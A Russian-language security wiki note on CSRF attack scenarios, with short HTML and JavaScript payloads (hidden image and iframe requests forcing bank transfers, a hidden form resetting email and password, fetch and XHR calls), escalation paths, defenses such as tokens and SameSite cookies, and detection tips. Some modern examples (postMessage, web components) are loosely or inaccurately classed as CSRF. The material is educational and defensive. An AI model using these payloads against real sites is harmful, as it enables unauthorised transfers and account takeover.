---
aliases: [Сценарии CSRF атак, Примеры CSRF атак, Реальные случаи CSRF]
tags: [security, csrf, attack-vectors, web-security]
---

# Сценарии-атак

## Обзор

Сценарии атак CSRF (Cross-Site Request Forgery) представляют собой конкретные примеры того, как злоумышленники могут эксплуатировать уязвимости подделки межсайтовых запросов для выполнения нежелательных действий в веб-приложениях от имени аутентифицированных пользователей. Понимание этих сценариев позволяет разработчикам лучше защищать свои приложения.

## Классические сценарии атак CSRF

### 1. Финансовые транзакции
**Описание**: Злоумышленник заставляет пользователя выполнить перевод средств.
```html
<img src="https://bank.com/transfer?to=attacker&amount=1000" width="0" height="0">
```
**Последствия**: Непреднамеренный перевод средств со счета пользователя.

### 2. Изменение профиля пользователя
**Описание**: Изменение email, пароля или других настроек профиля.
```html
<form action="https://site.com/profile" method="POST">
  <input type="hidden" name="email" value="attacker@example.com">
  <input type="hidden" name="password" value="newpassword">
  <input type="submit" value="Click here for a prize!">
</form>
```
**Последствия**: Потеря контроля над аккаунтом пользователя.

### 3. Подписка на услуги
**Описание**: Принудительная подписка пользователя на платные услуги.
```html
<a href="https://shop.com/subscribe?plan=premium">Click here for free gift!</a>
```
**Последствия**: Нежелательные списания с карты пользователя.

### 4. Удаление данных
**Описание**: Удаление сообщений, файлов или других данных пользователя.
```html
<img src="https://forum.com/delete_post?id=12345" style="display:none;">
```
**Последствия**: Потеря важной информации пользователя.

## Современные сценарии атак CSRF

### 1. Атаки на API
**Описание**: CSRF-атаки через API-запросы, часто используя JSON.
```javascript
fetch('https://api.example.com/settings', {
  method: 'PUT',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({
    email: 'attacker@example.com',
    notifications: true
  })
});
```

### 2. Атаки через iframe
**Описание**: Использование скрытых iframe для выполнения запросов.
```html
<iframe src="https://bank.com/transfer?to=attacker&amount=500" style="display:none;"></iframe>
```

### 3. Атаки через AJAX
**Описание**: Использование JavaScript для выполнения асинхронных запросов.
```javascript
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://social.com/message", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("message=Check this out: http://evil.com");
```

## Примеры реальных атак CSRF

### Пример 1: CSRF в социальной сети (2013)
- **Платформа**: Facebook
- **Метод**: CSRF-атака через изменение статуса
- **Последствия**: Злоумышленник мог заставить пользователей публиковать определенные сообщения

### Пример 2: CSRF в платежной системе
- **Платформа**: PayPal
- **Метод**: Подделка запроса на перевод средств
- **Последствия**: Нежелательные переводы от имени пользователей

### Пример 3: CSRF в CMS
- **Платформа**: WordPress
- **Метод**: CSRF-атака на административную панель
- **Последствия**: Возможность изменения настроек сайта или добавления пользователей

## Сценарии атак с эскалацией

### 1. CSRF → Привилегии администратора
- Использование CSRF для повышения привилегий
- Злоумышленник может получить административные права

### 2. CSRF → XSS
- Использование CSRF для внедрения XSS-скрипта
- Комбинация двух типов атак для усиления воздействия

### 3. CSRF → Аccount Takeover
- Изменение email или пароля через CSRF
- Перехват контроля над аккаунтом

## Атаки на современные технологии

### 1. CSRF в Single Page Applications (SPA)
**Описание**: Атаки на приложения, использующие JavaScript для взаимодействия с API.
```javascript
// Злоумышленник может вызвать функцию приложения из другого домена
window.parent.postMessage({
  type: 'TRANSFER',
  to: 'attacker',
  amount: 1000
}, 'https://victim-app.com');
```

### 2. CSRF в веб-компонентах
**Описание**: Использование уязвимостей в пользовательских элементах.
```html
<bank-transfer-widget to="attacker" amount="500"></bank-transfer-widget>
```

### 3. CSRF через WebSockets
**Описание**: Атаки на приложения, использующие WebSocket-соединения.
```javascript
// Злоумышленник может попытаться отправить сообщение через WebSocket
websocket.send(JSON.stringify({
  action: 'transfer',
  to: 'attacker',
  amount: 1000
}));
```

## Защита от сценариев атак

### 1. Использование CSRF-токенов
- Генерация уникальных токенов для каждой сессии
- Проверка токенов при изменяющих запросах
- Использование синхронизаторских токенов

### 2. Проверка HTTP Referer
- Проверка источника запроса (с осторожностью)
- Учет ограничений приватности и безопасности

### 3. Использование SameSite атрибутов
- Установка SameSite=Strict для критических операций
- Использование SameSite=Lax для менее критичных операций

### 4. Дополнительная верификация
- Запрос подтверждения для критических операций
- Использование двухфакторной аутентификации
- Требование повторного ввода пароля для чувствительных действий

## Примеры защиты от конкретных сценариев

### Защита от финансовых транзакций
```html
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
  <input type="hidden" name="user_id" value="{{ user_id }}">
  <input type="text" name="to" placeholder="Recipient">
  <input type="number" name="amount">
  <input type="password" name="confirm_password" placeholder="Confirm with password">
  <button type="submit">Transfer</button>
</form>
```

### Защита от изменения профиля
```javascript
// Проверка токена в JavaScript-запросах
fetch('/api/profile', {
  method: 'PUT',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': document.querySelector('meta[name="csrf-token"]').getAttribute('content')
  },
  body: JSON.stringify({
    email: newEmail
  })
});
```

## Обнаружение CSRF-атак

### 1. Мониторинг аномального поведения
- Несколько операций за короткий промежуток времени
- Подозрительные источники запросов
- Нестандартные шаблоны поведения

### 2. Логирование и анализ
- Логирование всех изменяющих запросов
- Анализ паттернов запросов
- Обнаружение подозрительных серий действий

## Связанные темы

- [[Типы-CSRF-атак]]
- [[Методы-защиты-от-CSRF]]
- [[Анти-CSRF-токены]]
- [[Оценка-угроз]]

> [!tip] Совет
> Регулярно тестируйте приложение на известные сценарии атак CSRF, особенно после добавления новых функций, изменяющих состояние.

> [!warning] Важно
> Новые сценарии атак CSRF постоянно появляются с развитием веб-технологий, поэтому важно следить за последними уязвимостями и методами защиты.